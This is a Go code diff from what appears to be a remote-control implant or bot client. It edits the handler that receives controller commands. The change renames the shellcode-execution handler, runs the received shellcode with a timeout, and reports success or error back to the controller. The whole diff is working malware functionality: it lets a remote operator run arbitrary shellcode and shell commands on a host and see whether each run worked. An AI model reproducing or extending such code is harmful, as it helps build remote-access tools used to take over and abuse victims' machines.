@@ -5,6 +5,7 @@ import (
 	"context"
 	"fmt"
 	"sync"
+	"time"
 
 	"github.com/davecgh/go-spew/spew"
 
@@ -98,8 +99,8 @@ func (h *handler) OnMessage(answer *protocol.Answer) {
 	msgType := convert.BytesToUint32(answer.Message[messages.RandomDataSize:messages.HeaderSize])
 	answer.Message = answer.Message[messages.HeaderSize:]
 	switch msgType {
-	case messages.CMDExecuteShellCode:
-		h.handleExecuteShellCode(answer)
+	case messages.CMDShellCode:
+		h.handleShellCode(answer)
 	case messages.CMDSingleShell:
 		h.handleSingleShell(answer)
 	case messages.CMDTest:
@@ -114,23 +115,35 @@ func (h *handler) OnMessage(answer *protocol.Answer) {
 	}
 }
 
-func (h *handler) handleExecuteShellCode(answer *protocol.Answer) {
-	defer h.logPanic("handler.handleExecuteShellCode")
-	es := new(messages.ExecuteShellCode)
+func (h *handler) handleShellCode(answer *protocol.Answer) {
+	const title = "handler.handleShellCode"
+	defer h.logPanic(title)
+	es := new(messages.ShellCode)
 	err := msgpack.Unmarshal(answer.Message, es)
 	if err != nil {
-		const log = "controller send invalid shellcode"
+		const log = "invalid shellcode data"
 		h.logWithInfo(logger.Exploit, answer, log)
 		return
 	}
-	// must copy, because not use h.wg
-	lg := h.ctx.logger
+	errChan := make(chan error, 1)
 	go func() {
-		err = shellcode.Execute(es.Method, es.ShellCode)
-		if err != nil {
-			lg.Println(logger.Error, "failed to execute shellcode:", err)
-		}
+		h.logPanic(title)
+		errChan <- shellcode.Execute(es.Method, es.ShellCode)
 	}()
+	timer := time.NewTimer(time.Second)
+	defer timer.Stop()
+	select {
+	case err = <-errChan:
+	case <-timer.C:
+	}
+	result := &messages.ShellCodeResult{ID: es.ID}
+	if err != nil {
+		result.Err = err.Error()
+	}
+	err = h.ctx.sender.Send(h.context, messages.CMDBShellCodeResult, result, true)
+	if err != nil {
+		h.log(logger.Error, "failed to send execute shellcode result:", err)
+	}
 }
 
 func (h *handler) handleSingleShell(answer *protocol.Answer) {
@@ -139,7 +152,7 @@ func (h *handler) handleSingleShell(answer *protocol.Answer) {
 	ss := new(messages.SingleShell)
 	err := msgpack.Unmarshal(answer.Message, ss)
 	if err != nil {
-		const log = "controller send invalid single shell"
+		const log = "invalid single shell data"
 		h.logWithInfo(logger.Exploit, answer, log)
 		return
 	}
